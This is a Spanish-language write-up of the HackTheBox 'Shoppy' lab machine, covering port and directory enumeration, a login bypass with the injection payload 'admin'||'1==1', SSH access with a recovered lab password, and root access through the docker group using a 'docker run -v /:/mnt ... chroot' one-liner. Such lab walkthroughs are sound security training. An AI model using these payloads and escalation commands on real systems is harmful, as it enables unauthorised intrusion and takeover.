---
title: HackTheBox Shoppy Writeup
published: true
---

La máquina Shoppy, es una máquina de HackTheBox en la que mediante la explotación de esta conseguiremos la flag del usuario y la de root.


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar las seis primeras preguntas: 

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-01 11:50 EDT
Initiating SYN Stealth Scan at 11:50
Scanning 10.10.11.180 [65535 ports]
Discovered open port 80/tcp on 10.10.11.180
Discovered open port 22/tcp on 10.10.11.180
Discovered open port 9093/tcp on 10.10.11.180
Completed SYN Stealth Scan at 11:50, 14.04s elapsed (65535 total ports)
Nmap scan report for 10.10.11.180
Host is up, received user-set (0.047s latency).
Scanned at 2022-11-01 11:50:12 EDT for 14s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
9093/tcp open  copycat syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds
           Raw packets sent: 69654 (3.065MB) | Rcvd: 66799 (2.672MB)
```

Tenemos tres puertos abiertos, analizaremos la versión y servicio de los mismos con nmap para intentar sacar más información:

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-01 11:52 EDT
Stats: 0:00:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 11:53 (0:00:16 remaining)
Stats: 0:00:58 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 11:54 (0:00:29 remaining)
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.041s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-title:             Shoppy Wait Page        
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Tue, 01 Nov 2022 15:52:52 GMT
```

Tras introducir la IP en el buscador nos reporta una cuenta atrás sin mucha más información: Tampoco encuentro nada al inspeccionar la página.

Vamos a intentar buscar directorios ocultos con gobuster:

```bash
❯ gobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2022/11/01 11:56:00 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 28] [--> /login]
/Admin                (Status: 302) [Size: 28] [--> /login]
/ADMIN                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/exports              (Status: 301) [Size: 181] [--> /exports/]
/favicon.ico          (Status: 200) [Size: 213054]             
/fonts                (Status: 301) [Size: 177] [--> /fonts/]  
/images               (Status: 301) [Size: 179] [--> /images/] 
/js                   (Status: 301) [Size: 171] [--> /js/]     
/Login                (Status: 200) [Size: 1074]               
/login                (Status: 200) [Size: 1074]               
                                                               
===============================================================
2022/11/01 11:56:35 Finished
===============================================================
```

Vemos que el único que nos reporta un código exitoso es /login (sin tener en cuenta/favicon.ico)

Al entrar en este aparece un panel de autentificación.

En el escaneo anterior veo que la versión de nginx es 1.23.1. Busco exploits pero no encuentro nada, únicamente un CVE del que no puedo abusar.

Tras varios intentos de bypassear el panel de login lo consigo con:

> "admin'||'1==1"

Estamos dentro. Podemos buscar por usuarios por lo que en el recuadro de búsqueda vuelvo a introducir "admin'||'1==1" y me reporta dos usuarios con sus contraseñas (hash)

En este punto descifro la contraseña del usuario.

He de decir que me estanqué un poco aquí pero volviendo al escaneo de nmap veo que puede haber un host (sundominio) por lo que con gobuster voy a buscarlo con:

```bash
❯ gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/11/01 12:32:53 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
                                                       
===============================================================
2022/11/01 12:34:37 Finished
===============================================================
```

Entro y volvemos atener un panel de autentificación en el que con el usuario y contraseña que hemos conseguido descifrar conseguimos entrar.

De forma directa nos dicen como conectarnos a la máquina (usuario y contraseña). Lo intentamos mediante SSH y lo conseguimos.

```bash
❯ ssh jaeger@10.10.11.180
jaeger@10.10.11.180's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov  1 10:04:26 2022 from 10.10.14.89
jaeger@shoppy:~$ whoami
jaeger
```

Conseguimso así la flag del usuario en el arhivo user.txt

A continuación hacemos sudo -l para ver los comandos que podemos ejecutar como root:

```bash
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Sorry, try again.
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

Parece ser que podemos ejecutar un archivo. Al ejecutarlo nos pide una contraseña. Intento con la contraseña del usuario admin que nos había reportado anteriormente el primer login pero no funciona.

Al abrir /home/deploy/password-manager vemos que nos da la contraseña:

```bash
jaeger@shoppy:~$ cat /home/deploy/password-manager
ELF> @H@@8
          @@@@h���`
                   `
                    ��   ���-�=�=�P�-�=����DDP�td� � � LLQ�tdR�td�-�=�=PP/lib64/ld-linux-x86-64.so.2GNU@
)�GNU�▒�e�ms��
              C-�����fFr�S�w �� , N�"�▒�A▒#▒�@__gmon_start___ITM_deregisterTMCloneTable_ITM_registerTMCloneTable_ZNSaIcED1Ev_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6__ZSt3cin_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3__ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLEPKc_ZNSt8ios_base4InitD1Ev_ZNSolsEPFRSoS_E__gxx_personality_v0_ZNSaIcEC1Ev_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc_ZNSt8ios_base4InitC1Ev_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev_ZSt4cout_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE7compareERKS4__ZStrsIcSt11char_traitsIcESaIcEERSt13basic_istreamIT_T0_ES7_RNSt7__cxx1112basic_stringIS4_S5_T1_EE_Unwind_Resume__cxa_atexitsystem__cxa_finalize__libc_start_mainlibstdc++.so.6libgcc_s.so.1libc.so.6GCC_3.0GLIBC_2.2.5CXXABI_1.3GLIBCXX_3.4GLIBCXX_3.4.21( P&y
                                                                                                    @6 u▒i   HӯkTt)_q��k��4����@�?�?�?�?�?�?�?�@�@▒�A▒@ @(@0@8@@@HP@ X@
`@
  h@
x@�@H�H��/H��t��H���5�/�%�/@�%�/h������%�/h������%�/h������%�/h������%�/h������%�/h������%�/h������%�/h�p����%�/�`����%�/h   �P����%�/h
�@����%�/h
          �0����%�/h
H�=���.�DH�=I/H�B/H9�tH�n.H��t  �����H�=/H�5/H)�H��H��?H��H�H��tH�E.H����fD���=11u/UH�=�-H��t
                                                                                             H�=�.�-����H��H�S,H��H������H�E�H�������H�E�H����������<H��H�E�H��������H��H�E�H���w����H��H�E�H���f���H��H���
 ���H�]���UH��H���}��u��}�u2�}���u)H�=�.�����H�u,H�5�.H��+H���/������UH�����������]��AWL�=W)AVI��AUI��ATA��UH�-P)SL)�H������H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !@����0����@���h%����
```

# [](#header-1)Acceso al sistema

Lo ejecuto como root con la contraseña y nos da unas credenciales:

```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample 
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

Intento conectarme mediante SSH con el usuario deploy y la contraseña que nos da y funciona.

# [](#header-1)Escalada de privilegios

Entro al sistema como usuario deploy. Tras hacer id veo que estoy en el grupo docker:

```bash
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

Me dirigo a <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> y ejecuto la linea que nos muestra.

```bash
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
```

Nos dirigimos a /root y conseguimos así la flag de root en el archivo root.txt

Muchas gracias por leer este writeup, espero que te haya gustado!
